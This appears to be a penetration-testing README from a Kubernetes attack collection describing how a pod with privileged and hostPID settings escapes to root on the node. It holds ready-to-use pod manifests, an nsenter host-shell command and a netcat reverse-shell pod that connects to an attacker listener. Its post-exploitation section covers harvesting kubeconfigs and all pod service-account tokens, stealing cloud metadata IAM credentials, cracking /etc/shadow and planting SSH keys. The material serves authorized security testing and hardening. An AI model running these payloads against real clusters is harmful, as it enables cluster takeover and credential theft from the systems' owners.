# You can create a pod with privileged: true + hostPID

If you have `privileged=true` and `hostPID` available to you, you can use the `nsenter` command in the pod to enter PID=1 on the host, which allows also you gain a root shell on the host, which provides a path to cluster-admin. 

# Pod Creation

## Create a pod you can exec into
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-priv-and-hostpid
  labels: 
    app: pentest
spec:
  hostPID: true
  containers:
  - name: priv-and-hostpid
    image: ubuntu
    command: [ "/bin/bash", "-c", "--" ]    
    args: [ "while true; do sleep 30; done;" ]
    securityContext:
      privileged: true
  # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
  #nodeName: k8s-control-plane-node
  restartPolicy: Always
  ```
[pod-priv-and-hostpid.yaml](pod-priv-and-hostpid.yaml)

#### Option 1: Create pod from local yaml 
```bash
kubectl apply -f pod-priv-and-hostpid.yaml  
```
#### Option 2: Create pod from github hosted yaml
```
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-priv-and-hostpid.yaml  
```

#### Exec into pod 
```bash
kubectl -n [namespace] exec -it pod-priv-and-hostpid -- bash
```

#### Use nsenter to gain full root access on the node
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

## Or, create a reverse shell pod
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-everything-allowed-revshell
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-revshell
    image: busybox
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
  # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
  #nodeName: k8s-control-plane-node
  volumes:
  - name: noderoot
    hostPath:
      path: /
```
[pod-priv-and-hostpid-revshell.yaml](pod-priv-and-hostpid-revshell.yaml)

#### Set up listener
```bash
nc -nvlp 3112
```

#### Create the pod
```bash
# Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
HOST="10.0.0.1" PORT="3112" 
envsubst < ./yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml | kubectl apply -f -
```

#### Catch the shell and chroot to /host 
```bash
~ nc -nvlp 3112
Listening on 0.0.0.0 3112
Connection received on 10.0.0.162 42035
```

# Post exploitation

You now have root access to the node. Here are some next steps: 

#### Look for kubeconfig's in the host filesystem 
If you are lucky, you will find a cluster-admin config with full access to everything (not so lucky here on this GKE node)

```bash
find / -name kubeconfig
/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/merged/var/lib/kube-proxy/kubeconfig
/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/diff/var/lib/kube-proxy/kubeconfig
/var/lib/node-problem-detector/kubeconfig
/var/lib/kubelet/kubeconfig
/var/lib/kube-proxy/kubeconfig
/home/kubernetes/containerized_mounter/rootfs/var/lib/kubelet/kubeconfig
/mnt/stateful_partition/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/diff/var/lib/kube-proxy/kubeconfig
/mnt/stateful_partition/var/lib/node-problem-detector/kubeconfig
/mnt/stateful_partition/var/lib/kubelet/kubeconfig
/mnt/stateful_partition/var/lib/kube-proxy/kubeconfig
```

#### Grab all tokens from all pods on the system
Use something like access-matrix to see if any of them give you more permission than you currently have. Look for tokens that have permissions to get secrets in kube-system

```bash
# This lists the location of every service account used by every pod on the node you are on, and tells you the namespace. 
tokens=`find /var/lib/kubelet/pods/ -name token -type l`; for token in $tokens; do parent_dir="$(dirname "$token")"; namespace=`cat $parent_dir/namespace`; echo $namespace "|" $token ; done | sort

default | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-t25ss/token
default | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-t25ss/token
development | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token
development | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token
kube-system | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/kube-proxy-token-x6j9x/token
kube-system | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/calico-node-token-d426t/token


# For each interesting token, copy token value to somewhere you have kubectl set and see what permissions it has assigned to it
DTOKEN=`cat /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
kubectl auth can-i --list --token=$DTOKEN -n development # Shows namespace specific permissions
kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions

# Does the token allow you to view secrets in that namespace? How about other namespaces?
# Does it allow you to create clusterrolebindings? Can you bind your user to cluster-admin?
```

If cloud hosted, look at the metadata service and checkout user-data, and the IAM permissions. If an IAM role has been assigned to the node, use that to see wht access you hav in the cloud environment. 

```bash
curl http://169.254.169.254/latest/user-data 
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/[account]/default/token
```

Some other ideas:
* Add your public key to node and ssh to it
* Crack passwords in /etc/shadow, see if you can use them to access other nodes
* Look at the volumes that each of the pods have mounted. You might find some pretty sensitive stuff in there

Attacks that apply to all pods, even without any special permissions
* Cloud metadata service
* `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
* Kubernetes exploits
* Hunting for vulnerable application/services in the cluster

# Demonstrate Impact

If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test. 

Reference(s): 
* https://twitter.com/mauilion/status/1129468485480751104
* https://github.com/kvaps/kubectl-node-shell
